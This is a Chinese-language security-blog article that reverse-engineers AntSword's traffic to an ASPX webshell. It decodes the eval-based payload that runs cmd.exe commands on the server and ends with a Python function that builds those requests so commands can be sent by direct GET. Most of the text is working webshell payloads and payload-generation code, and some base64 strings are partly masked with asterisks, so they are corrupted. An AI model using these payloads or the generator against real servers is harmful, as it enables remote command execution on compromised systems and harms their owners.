**近期研究了一下各种的shell脚本，发现aspx脚本与php、jsp在执行上有很大的不同。在网上找了一些aspx脚本大多是需要post数据或者用各种工具连接然后执行命令，没有详细的关于其实如何进行命令执行的报告。随后查找资料发现总体上有两种方式，一个是调用已上传的cmd来执行，另一种是利用宿主的cmd来执行。为了方便研究，下载了antsword并截取分析还原了其与aspx脚本的通信数据，并利用python语言还原了过程，同样也可以用url直接request访问，下面是一些详细的过程。**

##  实验环境

> 我使用的环境是antsword最新版，burpsuit，aspx环境，windows7操作系统，python3

##  环境搭建

环境搭建中注意把antsword的代理设置好就可以，如下图：

![](https://image.3001.net/images/20200308/1583643428_5e647b2435ea1.png!small)burpsuit正常设置就可以。

##  流量分析

先是直接利用antsword连接我实验环境中的shell，发送几条指令，从burp中查看其中的通信数据。

执行dir：

![](https://image.3001.net/images/20200308/1583643674_5e647c1ab2c08.png!small)

执行whoami：

![](https://image.3001.net/images/20200308/1583643799_5e647c976a1b5.png!small)其它的命令同理，就不一一截图了。把burp截取的数据进行分析（涉及我的环境部分数据略有删减），以dir和whoami命令为例：

    
    
    dir：
    Response.Write(%222f9f600c25%22)%3Bvar%20err%3AException%3Btry%7Beval(System.Text.Encoding.GetEncoding(%22UTF-8%22).GetString(System.Convert.FromBase64String(%22dmFyIGM9bmV3IFN5c3RlbS5EaWFnb**zdGljcy5Qc**jZXNzU3RhcnRJbmZvKFN5c3RlbS5UZXh0LkVuY29kaW5nLkdldEVuY29kaW5nKCJVVEYtOCIpLkdldFN0cmluZyhTeXN0ZW0uQ29udmVydC5Gc**tQmFzZTY0U3RyaW5nKFJlcXVlc3QuSXRlbVsicjlhMzQyYWM4Y2Y3MWMiXSkpKTt2YXIgZT1uZXcgU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MoKTt2YXIgb3V0OlN5c3RlbS5JTy5TdHJlYW1SZWFkZXIsRUk6U3lzdGVtLklPLlN0cmVhbVJlYWRlcjtjLlVzZVNoZWxsRXhlY3V0ZT1mYWxzZTtjLlJlZGlyZWN0U3RhbmRhcmRPdXRwdXQ9dHJ1ZTtjLlJlZGlyZWN0U3RhbmRhcmRFcnJvcj10cnVlO2UuU3RhcnRJbmZvPWM7Yy5Bcmd1bWVudHM9Ii9jICIrU3lzdGVtLlRleHQuRW5jb2RpbmcuR2V0RW5jb2RpbmcoIlVURi04IikuR2V0U3RyaW5nKFN5c3RlbS5Db252ZXJ0LkZyb21CYXNlNjRTdHJpbmcoUmVxdWVzdC5JdGVtWyJsOWJhYjAxYTNmOGY2MSJdKSk7aWYoUmVxdWVzdC5JdGVtWyJ4NThmYWMwNTEzNDg3YyJdKSB7dmFyIGVudnN0ciA9IFN5c3RlbS5UZXh0LkVuY29kaW5nLkdldEVuY29kaW5nKCJVVEYtOCIpLkdldFN0cmluZyhTeXN0ZW0uQ29udmVydC5Gc**tQmFzZTY0U3RyaW5nKFJlcXVlc3QuSXRlbVsieDU4ZmFjMDUxMzQ4N2MiXSkpO3ZhciBlbnZhcnIgPSBlbnZzdHIuc3BsaXQoInx8fGFzbGluZXx8fCIpO3ZhciBpO2ZvciAodmFyIGkgaW4gZW52YXJyKSB7dmFyIHNzID0gZW52YXJyW2ldLnNwbGl0KCJ8fHxhc2tleXx8fCIpO2lmIChzcy5sZW5ndGggIT0gMikge2NvbnRpbnVlO31jLkVudmlyb25tZW50VmFyaWFibGVzLkFkZChzc1swXSxzc1sxXSk7fX1lLlN0YXJ0KCk7b3V0PWUuU3RhbmRhcmRPdXRwdXQ7RUk9ZS5TdGFuZGFyZEVyc**yO2UuQ2xvc2UoKTtSZXNwb25zZS5Xcml0ZShvdXQuUmVhZFRvRW5kKCkgKyBFSS5SZWFkVG9FbmQoKSk7%22))%2C%22unsafe%22)%3B%7Dcatch(err)%7BResponse.Write(%22ERROR%3A%2F%2F%20%22%2Berr.message)%3B%7DResponse.Write(%22ce497c0b5%22)%3BResponse.End()%3B&l9bab01a3f8f61=Y2QgL2QgIkM6XFxQc**nEV4Y2hhbmdlIFNlcnZlclxcVjE1XFxGc**udEVuZFxcSHR0cFByb3h5XFxvd2FcXGF1dGgiJmRpciZlY2hvIFtTXSZjZCZlY2hvIFtFXQ==&r9a342ac8cf71c=Y21k&x58fac0513487c=
    
    
    whoami:
    Response.Write(%22c270418f%22)%3Bvar%20err%3AException%3Btry%7Beval(System.Text.Encoding.GetEncoding(%22UTF-8%22).GetString(System.Convert.FromBase64String(%22dmFyIGM9bmV3IFN5c3RlbS5EaWFnb**zdGljcy5Qc**jZXNzU3RhcnRJbmZvKFN5c3RlbS5UZXh0LkVuY29kaW5nLkdldEVuY29kaW5nKCJVVEYtOCIpLkdldFN0cmluZyhTeXN0ZW0uQ29udmVydC5Gc**tQmFzZTY0U3RyaW5nKFJlcXVlc3QuSXRlbVsicjlhMzQyYWM4Y2Y3MWMiXSkpKTt2YXIgZT1uZXcgU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MoKTt2YXIgb3V0OlN5c3RlbS5JTy5TdHJlYW1SZWFkZXIsRUk6U3lzdGVtLklPLlN0cmVhbVJlYWRlcjtjLlVzZVNoZWxsRXhlY3V0ZT1mYWxzZTtjLlJlZGlyZWN0U3RhbmRhcmRPdXRwdXQ9dHJ1ZTtjLlJlZGlyZWN0U3RhbmRhcmRFcnJvcj10cnVlO2UuU3RhcnRJbmZvPWM7Yy5Bcmd1bWVudHM9Ii9jICIrU3lzdGVtLlRleHQuRW5jb2RpbmcuR2V0RW5jb2RpbmcoIlVURi04IikuR2V0U3RyaW5nKFN5c3RlbS5Db252ZXJ0LkZyb21CYXNlNjRTdHJpbmcoUmVxdWVzdC5JdGVtWyJsOWJhYjAxYTNmOGY2MSJdKSk7aWYoUmVxdWVzdC5JdGVtWyJ4NThmYWMwNTEzNDg3YyJdKSB7dmFyIGVudnN0ciA9IFN5c3RlbS5UZXh0LkVuY29kaW5nLkdldEVuY29kaW5nKCJVVEYtOCIpLkdldFN0cmluZyhTeXN0ZW0uQ29udmVydC5Gc**tQmFzZTY0U3RyaW5nKFJlcXVlc3QuSXRlbVsieDU4ZmFjMDUxMzQ4N2MiXSkpO3ZhciBlbnZhcnIgPSBlbnZzdHIuc3BsaXQoInx8fGFzbGluZXx8fCIpO3ZhciBpO2ZvciAodmFyIGkgaW4gZW52YXJyKSB7dmFyIHNzID0gZW52YXJyW2ldLnNwbGl0KCJ8fHxhc2tleXx8fCIpO2lmIChzcy5sZW5ndGggIT0gMikge2NvbnRpbnVlO31jLkVudmlyb25tZW50VmFyaWFibGVzLkFkZChzc1swXSxzc1sxXSk7fX1lLlN0YXJ0KCk7b3V0PWUuU3RhbmRhcmRPdXRwdXQ7RUk9ZS5TdGFuZGFyZEVyc**yO2UuQ2xvc2UoKTtSZXNwb25zZS5Xcml0ZShvdXQuUmVhZFRvRW5kKCkgKyBFSS5SZWFkVG9FbmQoKSk7%22))%2C%22unsafe%22)%3B%7Dcatch(err)%7BResponse.Write(%22ERROR%3A%2F%2F%20%22%2Berr.message)%3B%7DResponse.Write(%223c7d051022e%22)%3BResponse.End()%3B&l9bab01a3f8f61=Y2QgL2QgIkM6XFxQc**ncmFtIEZpbGVzXFxNaWNyb3NvZnRcXEV4YE1XFxGc**udEVuZFxcSHRFcXGF1dGgiJndob2FtaSZlY2hvIFtTXSZjZCZlY2hvIFtFXQ%3D%3D&r9a342ac8cf71c=Y21k&x58fac0513487c=

刚开始一看感觉数据全部都是编码，仔细看的可以发现主要是两种编码：url和base64

所以我们第一步把数据url解码(这里需要注意一点，数据后半部分并没有url编码，仍可以看到符号)：

    
    
    dir
    Response.Write("2f9f600c25");var err:Exception;try{eval(System.Text.Encoding.GetEncoding("UTF-8").GetString(System.Convert.FromBase64String("dmFyIGM9bmV3IFN5c3RlbS5EaWFnb**zdGljcy5Qc**jZXNzU3RhcnRJbmZvKFN5c3RlbS5UZXh0LkVuY29kaW5nLkdldEVuY29kaW5nKCJVVEYtOCIpLkdldFN0cmluZyhTeXN0ZW0uQ29udmVydC5Gc**tQmFzZTY0U3RyaW5nKFJlcXVlc3QuSXRlbVsicjlhMzQyYWM4Y2Y3MWMiXSkpKTt2YXIgZT1uZXcgU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MoKTt2YXIgb3V0OlN5c3RlbS5JTy5TdHJlYW1SZWFkZXIsRUk6U3lzdGVtLklPLlN0cmVhbVJlYWRlcjtjLlVzZVNoZWxsRXhlY3V0ZT1mYWxzZTtjLlJlZGlyZWN0U3RhbmRhcmRPdXRwdXQ9dHJ1ZTtjLlJlZGlyZWN0U3RhbmRhcmRFcnJvcj10cnVlO2UuU3RhcnRJbmZvPWM7Yy5Bcmd1bWVudHM9Ii9jICIrU3lzdGVtLlRleHQuRW5jb2RpbmcuR2V0RW5jb2RpbmcoIlVURi04IikuR2V0U3RyaW5nKFN5c3RlbS5Db252ZXJ0LkZyb21CYXNlNjRTdHJpbmcoUmVxdWVzdC5JdGVtWyJsOWJhYjAxYTNmOGY2MSJdKSk7aWYoUmVxdWVzdC5JdGVtWyJ4NThmYWMwNTEzNDg3YyJdKSB7dmFyIGVudnN0ciA9IFN5c3RlbS5UZXh0LkVuY29kaW5nLkdldEVuY29kaW5nKCJVVEYtOCIpLkdldFN0cmluZyhTeXN0ZW0uQ29udmVydC5Gc**tQmFzZTY0U3RyaW5nKFJlcXVlc3QuSXRlbVsieDU4ZmFjMDUxMzQ4N2MiXSkpO3ZhciBlbnZhcnIgPSBlbnZzdHIuc3BsaXQoInx8fGFzbGluZXx8fCIpO3ZhciBpO2ZvciAodmFyIGkgaW4gZW52YXJyKSB7dmFyIHNzID0gZW52YXJyW2ldLnNwbGl0KCJ8fHxhc2tleXx8fCIpO2lmIChzcy5sZW5ndGggIT0gMikge2NvbnRpbnVlO31jLkVudmlyb25tZW50VmFyaWFibGVzLkFkZChzc1swXSxzc1sxXSk7fX1lLlN0YXJ0KCk7b3V0PWUuU3RhbmRhcmRPdXRwdXQ7RUk9ZS5TdGFuZGFyZEVyc**yO2UuQ2xvc2UoKTtSZXNwb25zZS5Xcml0ZShvdXQuUmVhZFRvRW5kKCkgKyBFSS5SZWFkVG9FbmQoKSk7")),"unsafe");}catch(err){Response.Write("ERROR:// "+err.message);}Response.Write("ce497c0b5");Response.End();&l9bab01a3f8f61=Y2QgL2QgIkM6XFxQc**nEV4Y2hhbmdlIFNlcnZlclxcVjE1XFxGc**udEVuZFxcSHR0cFByb3h5XFxvd2FcXGF1dGgiJmRpciZlY2hvIFtTXSZjZCZlY2hvIFtFXQ%3D%3D&r9a342ac8cf71c=Y21k&x58fac0513487c=
    
    
    whoami
    Response.Write("c270418f");var err:Exception;try{eval(System.Text.Encoding.GetEncoding("UTF-8").GetString(System.Convert.FromBase64String("dmFyIGM9bmV3IFN5c3RlbS5EaWFnb**zdGljcy5Qc**jZXNzU3RhcnRJbmZvKFN5c3RlbS5UZXh0LkVuY29kaW5nLkdldEVuY29kaW5nKCJVVEYtOCIpLkdldFN0cmluZyhTeXN0ZW0uQ29udmVydC5Gc**tQmFzZTY0U3RyaW5nKFJlcXVlc3QuSXRlbVsicjlhMzQyYWM4Y2Y3MWMiXSkpKTt2YXIgZT1uZXcgU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MoKTt2YXIgb3V0OlN5c3RlbS5JTy5TdHJlYW1SZWFkZXIsRUk6U3lzdGVtLklPLlN0cmVhbVJlYWRlcjtjLlVzZVNoZWxsRXhlY3V0ZT1mYWxzZTtjLlJlZGlyZWN0U3RhbmRhcmRPdXRwdXQ9dHJ1ZTtjLlJlZGlyZWN0U3RhbmRhcmRFcnJvcj10cnVlO2UuU3RhcnRJbmZvPWM7Yy5Bcmd1bWVudHM9Ii9jICIrU3lzdGVtLlRleHQuRW5jb2RpbmcuR2V0RW5jb2RpbmcoIlVURi04IikuR2V0U3RyaW5nKFN5c3RlbS5Db252ZXJ0LkZyb21CYXNlNjRTdHJpbmcoUmVxdWVzdC5JdGVtWyJsOWJhYjAxYTNmOGY2MSJdKSk7aWYoUmVxdWVzdC5JdGVtWyJ4NThmYWMwNTEzNDg3YyJdKSB7dmFyIGVudnN0ciA9IFN5c3RlbS5UZXh0LkVuY29kaW5nLkdldEVuY29kaW5nKCJVVEYtOCIpLkdldFN0cmluZyhTeXN0ZW0uQ29udmVydC5Gc**tQmFzZTY0U3RyaW5nKFJlcXVlc3QuSXRlbVsieDU4ZmFjMDUxMzQ4N2MiXSkpO3ZhciBlbnZhcnIgPSBlbnZzdHIuc3BsaXQoInx8fGFzbGluZXx8fCIpO3ZhciBpO2ZvciAodmFyIGkgaW4gZW52YXJyKSB7dmFyIHNzID0gZW52YXJyW2ldLnNwbGl0KCJ8fHxhc2tleXx8fCIpO2lmIChzcy5sZW5ndGggIT0gMikge2NvbnRpbnVlO31jLkVudmlyb25tZW50VmFyaWFibGVzLkFkZChzc1swXSxzc1sxXSk7fX1lLlN0YXJ0KCk7b3V0PWUuU3RhbmRhcmRPdXRwdXQ7RUk9ZS5TdGFuZGFyZEVyc**yO2UuQ2xvc2UoKTtSZXNwb25zZS5Xcml0ZShvdXQuUmVhZFRvRW5kKCkgKyBFSS5SZWFkVG9FbmQoKSk7")),"unsafe");}catch(err){Response.Write("ERROR:// "+err.message);}Response.Write("3c7d051022e");Response.End();&l9bab01a3f8f61=Y2QgL2QgIkM6XFxQc**ncmFtIEZpbGVzXFxNaWNyb3NvZnRcXEV4YE1XFxGc**udEVuZFxcSHRFcXGF1dGgiJndob2FtaSZlY2hvIFtTXSZjZCZlY2hvIFtFXQ%3D%3D&r9a342ac8cf71c=Y21k&x58fac0513487c=

进一步可以看到第一行中的base64调用‘System.Text.Encoding.GetEncoding("UTF-8").GetString(System.Convert.FromBase64String’，可以对应的把字符串进行base64解码（只看解码的部分）：

    
    
    dir
    var c=new System.Diagnostics.ProcessStartInfo(System.Text.Encoding.GetEncoding("UTF-8").GetString(System.Convert.FromBase64String(Request.Item["r9a342ac8cf71c"])));var e=new System.Diagnostics.Process();var out:System.IO.StreamReader,EI:System.IO.StreamReader;c.UseShellExecute=false;c.RedirectStandardOutput=true;c.RedirectStandardError=true;e.StartInfo=c;c.Arguments="/c "+System.Text.Encoding.GetEncoding("UTF-8").GetString(System.Convert.FromBase64String(Request.Item["l9bab01a3f8f61"]));if(Request.Item["x58fac0513487c"]) {var envstr = System.Text.Encoding.GetEncoding("UTF-8").GetString(System.Convert.FromBase64String(Request.Item["x58fac0513487c"]));var envarr = envstr.split("|||asline|||");var i;for (var i in envarr) {var ss = envarr[i].split("|||askey|||");if (ss.length != 2) {continue;}c.EnvironmentVariables.Add(ss[0],ss[1]);}}e.Start();out=e.StandardOutput;EI=e.StandardError;e.Close();Response.Write(out.ReadToEnd() + EI.ReadToEnd());
    
    
    whoami
    var c=new System.Diagnostics.ProcessStartInfo(System.Text.Encoding.GetEncoding("UTF-8").GetString(System.Convert.FromBase64String(Request.Item["r9a342ac8cf71c"])));var e=new System.Diagnostics.Process();var out:System.IO.StreamReader,EI:System.IO.StreamReader;c.UseShellExecute=false;c.RedirectStandardOutput=true;c.RedirectStandardError=true;e.StartInfo=c;c.Arguments="/c "+System.Text.Encoding.GetEncoding("UTF-8").GetString(System.Convert.FromBase64String(Request.Item["l9bab01a3f8f61"]));if(Request.Item["x58fac0513487c"]) {var envstr = System.Text.Encoding.GetEncoding("UTF-8").GetString(System.Convert.FromBase64String(Request.Item["x58fac0513487c"]));var envarr = envstr.split("|||asline|||");var i;for (var i in envarr) {var ss = envarr[i].split("|||askey|||");if (ss.length != 2) {continue;}c.EnvironmentVariables.Add(ss[0],ss[1]);}}e.Start();out=e.StandardOutput;EI=e.StandardError;e.Close();Response.Write(out.ReadToEnd() + EI.ReadToEnd());

对比之后发现，这两个部分完全相同，可以说这两段实现的功能一样。但是这是两条不同的命令，同时发现几处‘Request.Item’参数值，也就是说不同点应该在尾部的参数部分，继续分析数据的尾部：

    
    
    dir
    &l9bab01a3f8f61=Y2QgL2QgIkM6XFxQc**nEV4Y2hhbmdlIFNlcnZlclxcVjE1XFxGc**udEVuZFxcSHR0cFByb3h5XFxvd2FcXGF1dGgiJmRpciZlY2hvIFtTXSZjZCZlY2hvIFtFXQ==&r9a342ac8cf71c=Y21k&x58fac0513487c=
    
    
    whoami
    &l9bab01a3f8f61=Y2QgL2QgIkM6XFxQc**ncmFtIEZpbGVzXFxNaWNyb3NvZnRcXEV4YE1XFxGc**udEVuZFxcSHRFcXGF1dGgiJndob2FtaSZlY2hvIFtTXSZjZCZlY2hvIFtFXQ==&r9a342ac8cf71c=Y21k&x58fac0513487c=

这里可以看到传参地址与数值，数值都是用base64编码过了，参数可以与前面的接收参数相对应，接着对其进行base64解码（示例数据已处理过）：

![](https://image.3001.net/images/20200308/1583645819_5e64847b2bef9.png!small)![](https://image.3001.net/images/20200308/1583645824_5e6484802e4a5.png!small)可以看出命令在最后数据部分出现，所以还原时需要注意的部分就是最后参数的数值，涂黑部分为相同的shell路径。

##  还原过程分析

在分析过数据后可以初步了解通信数据的生成过程：

> 1、把shell路径和需要执行的命令进行base64编码（称之为payload1）
>
> 2、把payload1接在功能实现模块后，补齐其余参数部分生成payload2
>
> 3、对payload3进行url编码生成payload4
>
> 4、利用payload4对目标进行访问

但是发现利用python按此步骤还原会报错，我也是仔细有看了看数据才发现里面细节部分，就是我前面提到的部分数据没有进行最后的url编码。

再回到最初的数据：

    
    
    dir：
    Response.Write(%222f9f600c25%22)%3Bvar%20err%3AException%3Btry%7Beval(System.Text.Encoding.GetEncoding(%22UTF-8%22).GetString(System.Convert.FromBase64String(%22dmFyIGM9bmV3IFN5c3RlbS5EaWFnb**zdGljcy5Qc**jZXNzU3RhcnRJbmZvKFN5c3RlbS5UZXh0LkVuY29kaW5nLkdldEVuY29kaW5nKCJVVEYtOCIpLkdldFN0cmluZyhTeXN0ZW0uQ29udmVydC5Gc**tQmFzZTY0U3RyaW5nKFJlcXVlc3QuSXRlbVsicjlhMzQyYWM4Y2Y3MWMiXSkpKTt2YXIgZT1uZXcgU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MoKTt2YXIgb3V0OlN5c3RlbS5JTy5TdHJlYW1SZWFkZXIsRUk6U3lzdGVtLklPLlN0cmVhbVJlYWRlcjtjLlVzZVNoZWxsRXhlY3V0ZT1mYWxzZTtjLlJlZGlyZWN0U3RhbmRhcmRPdXRwdXQ9dHJ1ZTtjLlJlZGlyZWN0U3RhbmRhcmRFcnJvcj10cnVlO2UuU3RhcnRJbmZvPWM7Yy5Bcmd1bWVudHM9Ii9jICIrU3lzdGVtLlRleHQuRW5jb2RpbmcuR2V0RW5jb2RpbmcoIlVURi04IikuR2V0U3RyaW5nKFN5c3RlbS5Db252ZXJ0LkZyb21CYXNlNjRTdHJpbmcoUmVxdWVzdC5JdGVtWyJsOWJhYjAxYTNmOGY2MSJdKSk7aWYoUmVxdWVzdC5JdGVtWyJ4NThmYWMwNTEzNDg3YyJdKSB7dmFyIGVudnN0ciA9IFN5c3RlbS5UZXh0LkVuY29kaW5nLkdldEVuY29kaW5nKCJVVEYtOCIpLkdldFN0cmluZyhTeXN0ZW0uQ29udmVydC5Gc**tQmFzZTY0U3RyaW5nKFJlcXVlc3QuSXRlbVsieDU4ZmFjMDUxMzQ4N2MiXSkpO3ZhciBlbnZhcnIgPSBlbnZzdHIuc3BsaXQoInx8fGFzbGluZXx8fCIpO3ZhciBpO2ZvciAodmFyIGkgaW4gZW52YXJyKSB7dmFyIHNzID0gZW52YXJyW2ldLnNwbGl0KCJ8fHxhc2tleXx8fCIpO2lmIChzcy5sZW5ndGggIT0gMikge2NvbnRpbnVlO31jLkVudmlyb25tZW50VmFyaWFibGVzLkFkZChzc1swXSxzc1sxXSk7fX1lLlN0YXJ0KCk7b3V0PWUuU3RhbmRhcmRPdXRwdXQ7RUk9ZS5TdGFuZGFyZEVyc**yO2UuQ2xvc2UoKTtSZXNwb25zZS5Xcml0ZShvdXQuUmVhZFRvRW5kKCkgKyBFSS5SZWFkVG9FbmQoKSk7%22))%2C%22unsafe%22)%3B%7Dcatch(err)%7BResponse.Write(%22ERROR%3A%2F%2F%20%22%2Berr.message)%3B%7DResponse.Write(%22ce497c0b5%22)%3BResponse.End()%3B&l9bab01a3f8f61=Y2QgL2QgIkM6XFxQc**nEV4Y2hhbmdlIFNlcnZlclxcVjE1XFxGc**udEVuZFxcSHR0cFByb3h5XFxvd2FcXGF1dGgiJmRpciZlY2hvIFtTXSZjZCZlY2hvIFtFXQ%3D%3D&r9a342ac8cf71c=Y21k&x58fac0513487c=

数据末尾部分参数及其数值出现了‘=’，再仔细分析发现，只有base64编码部分需要url编码，其余参数部分不需要进行url编码。所以可以修改步骤如下：

> 1、把shell路径和需要执行的命令进行base64编码、url编码生成payload1
>
> 2、补齐数据末尾其它参数及数值生成payload2
>
> 3、功能模块base64编码、url编码并与payload2组合生成payload3
>
> 4、利用payload3访问shell

##  python还原实现

其核心部分为：

    
    
    def create_payload(cmd):
        payload_1 = 'var%20err%3AException%3Btry%7Beval(System.Text.Encoding.GetEncoding(%22UTF-8%22).GetString(System.Convert.FromBase64String(%22dmFyIGM9bmV3IFN5c3RlbS5EaWFnb**zdGljcy5Qc**jZXNzU3RhcnRJbmZvKFN5c3RlbS5UZXh0LkVuY29kaW5nLkdldEVuY29kaW5nKCJVVEYtOCIpLkdldFN0cmluZyhTeXN0ZW0uQ29udmVydC5Gc**tQmFzZTY0U3RyaW5nKFJlcXVlc3QuSXRlbVsieDhjY2EwOTc3NWFmNTQiXSkpKTt2YXIgZT1uZXcgU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MoKTt2YXIgb3V0OlN5c3RlbS5JTy5TdHJlYW1SZWFkZXIsRUk6U3lzdGVtLklPLlN0cmVhbVJlYWRlcjtjLlVzZVNoZWxsRXhlY3V0ZT1mYWxzZTtjLlJlZGlyZWN0U3RhbmRhcmRPdXRwdXQ9dHJ1ZTtjLlJlZGlyZWN0U3RhbmRhcmRFcnJvcj10cnVlO2UuU3RhcnRJbmZvPWM7Yy5Bcmd1bWVudHM9Ii9jICIrU3lzdGVtLlRleHQuRW5jb2RpbmcuR2V0RW5jb2RpbmcoIlVURi04IikuR2V0U3RyaW5nKFN5c3RlbS5Db252ZXJ0LkZyb21CYXNlNjRTdHJpbmcoUmVxdWVzdC5JdGVtWyJxMDg3MjU2YjZlNTA4NCJdKSk7aWYoUmVxdWVzdC5JdGVtWyJ6ODJmMzdjY2JjMjc0NiJdKSB7dmFyIGVudnN0ciA9IFN5c3RlbS5UZXh0LkVuY29kaW5nLkdldEVuY29kaW5nKCJVVEYtOCIpLkdldFN0cmluZyhTeXN0ZW0uQ29udmVydC5Gc**tQmFzZTY0U3RyaW5nKFJlcXVlc3QuSXRlbVsiejgyZjM3Y2NiYzI3NDYiXSkpO3ZhciBlbnZhcnIgPSBlbnZzdHIuc3BsaXQoInx8fGFzbGluZXx8fCIpO3ZhciBpO2ZvciAodmFyIGkgaW4gZW52YXJyKSB7dmFyIHNzID0gZW52YXJyW2ldLnNwbGl0KCJ8fHxhc2tleXx8fCIpO2lmIChzcy5sZW5ndGggIT0gMikge2NvbnRpbnVlO31jLkVudmlyb25tZW50VmFyaWFibGVzLkFkZChzc1swXSxzc1sxXSk7fX1lLlN0YXJ0KCk7b3V0PWUuU3RhbmRhcmRPdXRwdXQ7RUk9ZS5TdGFuZGFyZEVyc**yO2UuQ2xvc2UoKTtSZXNwb25zZS5Xcml0ZShvdXQuUmVhZFRvRW5kKCkgKyBFSS5SZWFkVG9FbmQoKSk7%22))%2C%22unsafe%22)%3B%7Dcatch(err)%7BResponse.Write(%22ERROR%3A%2F%2F%20%22%2Berr.message)%3B%7DResponse.End()%3B'
        payload_2 = '&q087256b6e5084='
        payload_3 = 'cd /d "这里需要防止shell路径"&'+ cmd + '&echo [Shell Path]&cd&'
        payload_4 = '&x8cca09775af54=Y21k&z82f37ccbc2746='
        payload_3 = urllib.parse.quote(base64.b64encode(payload_3.encode('utf-8')))
        payload = payload_1 + payload_2 + payload_3 + payload_4
        return payload

因为功能模块没有变化，所以就直接使用原始数据，没有对其进行解码和编码等操作。

也可以直接把生成的payload用浏览器url直接访问，可以不用工具连接post数据。

##  总结

主要对antsword与aspx连接通信的数据进行了截取分析还原，并利用python脚本进行了还原。研究的初始目的就是想直接用request方式访问，现在的工具对于aspx
shell很多都是post数据，但是post数据有时会出现一些问题，所以就研究了一下request方法，如有不对的地方欢迎大家交流。

 ***本文原创作者： Kriston，本文属于FreeBuf原创奖励计划，未经许可禁止转载**  
  

